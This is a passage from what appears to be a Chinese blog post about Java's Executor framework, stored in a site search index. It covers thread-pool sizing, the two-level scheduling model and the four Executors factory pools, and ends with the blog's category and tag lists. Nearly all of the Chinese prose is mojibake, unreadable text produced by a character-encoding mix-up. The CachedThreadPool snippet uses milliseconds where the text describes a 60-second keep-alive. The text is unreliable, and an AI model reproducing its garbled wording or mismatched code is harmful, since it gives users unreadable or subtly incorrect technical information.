ä¸ºCPUå¯†é›†å‹ä»»åŠ¡ä½¿å¾—CPUä½¿ç”¨ç‡å¾ˆé«˜ï¼Œè‹¥å¼€è¿‡å¤šçš„çº¿ç¨‹æ•°ï¼Œåªèƒ½å¢åŠ ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ï¼Œå› æ­¤ä¼šå¸¦æ¥é¢å¤–çš„å¼€é”€ã€‚ IOå¯†é›†å‹ä»»åŠ¡å¯ä»¥ä½¿ç”¨ç¨å¤§çš„çº¿ç¨‹æ± ï¼Œä¸€èˆ¬ä¸º2*CPUæ ¸å¿ƒæ•°ã€‚IOå¯†é›†å‹ä»»åŠ¡CPUä½¿ç”¨ç‡å¹¶ä¸é«˜ï¼Œå› æ­¤å¯ä»¥è®©CPUåœ¨ç­‰å¾…IOçš„æ—¶å€™å»å¤„ç†åˆ«çš„ä»»åŠ¡ï¼Œå……åˆ†åˆ©ç”¨CPUæ—¶é—´ã€‚ æ··åˆå‹ä»»åŠ¡å¯ä»¥å°†ä»»åŠ¡åˆ†æˆIOå¯†é›†å‹å’ŒCPUå¯†é›†å‹ä»»åŠ¡ï¼Œç„¶ååˆ†åˆ«ç”¨ä¸åŒçš„çº¿ç¨‹æ± å»å¤„ç†ã€‚åªè¦åˆ†å®Œä¹‹åä¸¤ä¸ªä»»åŠ¡çš„æ‰§è¡Œæ—¶é—´ç›¸å·®ä¸å¤§ï¼Œé‚£ä¹ˆå°±ä¼šæ¯”ä¸²è¡Œæ‰§è¡Œæ¥çš„é«˜æ•ˆã€‚å› ä¸ºå¦‚æœåˆ’åˆ†ä¹‹åä¸¤ä¸ªä»»åŠ¡æ‰§è¡Œæ—¶é—´ç›¸å·®ç”šè¿œï¼Œé‚£ä¹ˆå…ˆæ‰§è¡Œå®Œçš„ä»»åŠ¡å°±è¦ç­‰åæ‰§è¡Œå®Œçš„ä»»åŠ¡ï¼Œæœ€ç»ˆçš„æ—¶é—´ä»ç„¶å–å†³äºåæ‰§è¡Œå®Œçš„ä»»åŠ¡ï¼Œè€Œä¸”è¿˜è¦åŠ ä¸Šä»»åŠ¡æ‹†åˆ†ä¸åˆå¹¶çš„å¼€é”€ï¼Œå¾—ä¸å¿å¤±ã€‚ Executorä¸¤çº§è°ƒåº¦æ¨¡å‹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åœ¨HotSpotè™šæ‹Ÿæœºä¸­ï¼ŒJavaä¸­çš„çº¿ç¨‹å°†ä¼šè¢«ä¸€ä¸€æ˜ å°„ä¸ºæ“ä½œç³»ç»Ÿçš„çº¿ç¨‹ã€‚åœ¨Javaè™šæ‹Ÿæœºå±‚é¢ï¼Œç”¨æˆ·å°†å¤šä¸ªä»»åŠ¡æäº¤ç»™Executoræ¡†æ¶ï¼ŒExecutorè´Ÿè´£åˆ†é…çº¿ç¨‹æ‰§è¡Œå®ƒä»¬ï¼›åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ï¼Œæ“ä½œç³»ç»Ÿå†å°†è¿™äº›çº¿ç¨‹åˆ†é…ç»™å¤„ç†å™¨æ‰§è¡Œã€‚ Executorç»“æ„ Executoræ¡†æ¶ä¸­çš„æ‰€æœ‰ç±»å¯ä»¥åˆ†æˆä¸‰ç±»ï¼š ä»»åŠ¡ä»»åŠ¡æœ‰ä¸¤ç§ç±»å‹ï¼šRunnableå’ŒCallableã€‚ ä»»åŠ¡æ‰§è¡Œå™¨Executoræ¡†æ¶æœ€æ ¸å¿ƒçš„æ¥å£æ˜¯Executorï¼Œå®ƒè¡¨ç¤ºä»»åŠ¡çš„æ‰§è¡Œå™¨ã€‚Executorçš„å­æ¥å£ä¸ºExecutorServiceã€‚ExecutorServiceæœ‰ä¸¤å¤§å®ç°ç±»ï¼šThreadPoolExecutorå’ŒScheduledThreadPoolExecutorã€‚ æ‰§è¡Œç»“æœFutureæ¥å£è¡¨ç¤ºå¼‚æ­¥çš„æ‰§è¡Œç»“æœï¼Œå®ƒçš„å®ç°ç±»ä¸ºFutureTaskã€‚ çº¿ç¨‹æ± Executorså·¥å‚ç±»å¯ä»¥åˆ›å»ºå››ç§ç±»å‹çš„çº¿ç¨‹æ± ï¼Œé€šè¿‡Executors.newXXXå³å¯åˆ›å»ºã€‚ 1. FixedThreadPool public static ExecutorService newFixedThreadPool(int nThreads){ return new ThreadPoolExecutor(nThreads,nThreads,0L,TimeUnit.MILLISECONDS,new LinkedBlockingQueue&lt;Runnable&gt;()); } v2-984ba405f67249ab3cc043c75dbcbedd_hd.jpg å®ƒæ˜¯ä¸€ç§å›ºå®šå¤§å°çš„çº¿ç¨‹æ± ï¼› corePoolSizeå’ŒmaximunPoolSizeéƒ½ä¸ºç”¨æˆ·è®¾å®šçš„çº¿ç¨‹æ•°é‡nThreadsï¼› keepAliveTimeä¸º0ï¼Œæ„å‘³ç€ä¸€æ—¦æœ‰å¤šä½™çš„ç©ºé—²çº¿ç¨‹ï¼Œå°±ä¼šè¢«ç«‹å³åœæ­¢æ‰ï¼›ä½†è¿™é‡ŒkeepAliveTimeæ— æ•ˆï¼› é˜»å¡é˜Ÿåˆ—é‡‡ç”¨äº†LinkedBlockingQueueï¼Œå®ƒæ˜¯ä¸€ä¸ªæ— ç•Œé˜Ÿåˆ—ï¼› ç”±äºé˜»å¡é˜Ÿåˆ—æ˜¯ä¸€ä¸ªæ— ç•Œé˜Ÿåˆ—ï¼Œå› æ­¤æ°¸è¿œä¸å¯èƒ½æ‹’ç»ä»»åŠ¡ï¼› ç”±äºé‡‡ç”¨äº†æ— ç•Œé˜Ÿåˆ—ï¼Œå®é™…çº¿ç¨‹æ•°é‡å°†æ°¸è¿œç»´æŒåœ¨nThreadsï¼Œå› æ­¤maximumPoolSizeå’ŒkeepAliveTimeå°†æ— æ•ˆã€‚ 2. CachedThreadPool public static ExecutorService newCachedThreadPool(){ return new ThreadPoolExecutor(0,Integer.MAX_VALUE,60L,TimeUnit.MILLISECONDS,new SynchronousQueue&lt;Runnable&gt;()); } 123 v2-f9cff0865c6143ace452274046322335_hd.jpg å®ƒæ˜¯ä¸€ä¸ªå¯ä»¥æ— é™æ‰©å¤§çš„çº¿ç¨‹æ± ï¼› å®ƒæ¯”è¾ƒé€‚åˆå¤„ç†æ‰§è¡Œæ—¶é—´æ¯”è¾ƒå°çš„ä»»åŠ¡ï¼› corePoolSizeä¸º0ï¼ŒmaximumPoolSizeä¸ºæ— é™å¤§ï¼Œæ„å‘³ç€çº¿ç¨‹æ•°é‡å¯ä»¥æ— é™å¤§ï¼› keepAliveTimeä¸º60Sï¼Œæ„å‘³ç€çº¿ç¨‹ç©ºé—²æ—¶é—´è¶…è¿‡60Så°±ä¼šè¢«æ€æ­»ï¼› é‡‡ç”¨SynchronousQueueè£…ç­‰å¾…çš„ä»»åŠ¡ï¼Œè¿™ä¸ªé˜»å¡é˜Ÿåˆ—æ²¡æœ‰å­˜å‚¨ç©ºé—´ï¼Œè¿™æ„å‘³ç€åªè¦æœ‰è¯·æ±‚åˆ°æ¥ï¼Œå°±å¿…é¡»è¦æ‰¾åˆ°ä¸€æ¡å·¥ä½œçº¿ç¨‹å¤„ç†ä»–ï¼Œå¦‚æœå½“å‰æ²¡æœ‰ç©ºé—²çš„çº¿ç¨‹ï¼Œé‚£ä¹ˆå°±ä¼šå†åˆ›å»ºä¸€æ¡æ–°çš„çº¿ç¨‹ã€‚ 3. SingleThreadExecutor public static ExecutorService newSingleThreadExecutor(){ return new ThreadPoolExecutor(1,1,0L,TimeUnit.MILLISECONDS,new LinkedBlockingQueue&lt;Runnable&gt;()); } 123 åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å®ƒåªä¼šåˆ›å»ºä¸€æ¡å·¥ä½œçº¿ç¨‹å¤„ç†ä»»åŠ¡ï¼› é‡‡ç”¨çš„é˜»å¡é˜Ÿåˆ—ä¸ºLinkedBlockingQueueï¼› 4. ScheduledThreadPool å®ƒç”¨æ¥å¤„ç†å»¶æ—¶ä»»åŠ¡æˆ–å®šæ—¶ä»»åŠ¡ã€‚ img å®ƒæ¥æ”¶SchduledFutureTaskç±»å‹çš„ä»»åŠ¡ï¼Œæœ‰ä¸¤ç§æäº¤ä»»åŠ¡çš„æ–¹å¼ï¼š scheduledAtFixedRate scheduledWithFixedDelay SchduledFutureTaskæ¥æ”¶çš„å‚æ•°ï¼š timeï¼šä»»åŠ¡å¼€å§‹çš„æ—¶é—´ sequenceNumberï¼šä»»åŠ¡çš„åºå· periodï¼šä»»åŠ¡æ‰§è¡Œçš„æ—¶é—´é—´éš” å®ƒé‡‡ç”¨DelayQueueå­˜å‚¨ç­‰å¾…çš„ä»»åŠ¡ DelayQueueå†…éƒ¨å°è£…äº†ä¸€ä¸ªPriorityQueueï¼Œå®ƒä¼šæ ¹æ®timeçš„å…ˆåæ—¶é—´æ’åºï¼Œè‹¥timeç›¸åŒåˆ™æ ¹æ®sequenceNumberæ’åºï¼› DelayQueueä¹Ÿæ˜¯ä¸€ä¸ªæ— ç•Œé˜Ÿåˆ—ï¼› å·¥ä½œçº¿ç¨‹çš„æ‰§è¡Œè¿‡ç¨‹ï¼š å·¥ä½œçº¿ç¨‹ä¼šä»DelayQueueå–å·²ç»åˆ°æœŸçš„ä»»åŠ¡å»æ‰§è¡Œï¼› æ‰§è¡Œç»“æŸåé‡æ–°è®¾ç½®ä»»åŠ¡çš„åˆ°æœŸæ—¶é—´ï¼Œå†æ¬¡æ”¾å›DelayQueue å¾®ä¿¡å…¬ä¼—å·:æ¯æ—¥å­¦ä¹ å¹²è´§","categories":[],"tags":[]}],"categories":[{"name":"é«˜æ•°","slug":"é«˜æ•°","permalink":"https://blog.kayleh.top/categories/%E9%AB%98%E6%95%B0/"},{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/categories/C/"},{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/categories/linux/"},{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://blog.kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://blog.kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"},{"name":"java","slug":"java","permalink":"https://blog.kayleh.top/tags/java/"},{"name":"Concurrency","slug":"Concurrency","permalink":"https://blog.kayleh.top/tags/Concurrency/"},{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"},{"name":"middleware","slug":"middleware","permalink":"https://blog.kayleh.top/tags/middleware/"},{"name":"test","slug":"test","permalink":"https://blog.kayleh.top/tags/test/"},{"name":"security","slug":"security","permalink":"https://blog.kayleh.top/tags/security/"},{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"},{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"},{"name":"io","slug":"io","permalink":"https://blog.kayleh.top/tags/io/"},{"name":"jvm","slug":"jvm","permalink":"https://blog.kayleh.top/tags/jvm/"},{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"},{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"},{"name":"sql","slug":"sql","permalink":"https://blog.kayleh.top/tags/sql/"},{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/tags/linux/"},{"name":"project","slug":"project","permalink":"https://blog.kayleh.top/tags/project/"},{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"},{"name":"front","slug":"front","permalink":"https://blog.kayleh.top/tags/front/"},{"name":"docker","slug":"docker","permalink":"https://blog.kayleh.top/tags/docker/"},{"name":"ad","slug":"ad","permalink":"https://blog.kayleh.top/tags/ad/"},{"name":"maintain","slug":"maintain","permalink":"https://blog.kayleh.top/tags/maintain/"},{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"},{"name":"about","slug":"about","permalink":"https://blog.kayleh.top/tags/about/"},{"name":"Operating Systems","slug":"Operating-Systems","permalink":"https://blog.kayleh.top/tags/Operating-Systems/"},{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://blog.kayleh.top/tags/DesignPatterns/"},{"name":"resume","slug":"resume","permalink":"https://blog.kayleh.top/tags/resume/"},{"name":"computer","slug":"computer","permalink":"https://blog.kayleh.top/tags/computer/"},{"name":"interview","slug":"interview","permalink":"https://blog.kayleh.top/tags/interview/"}]}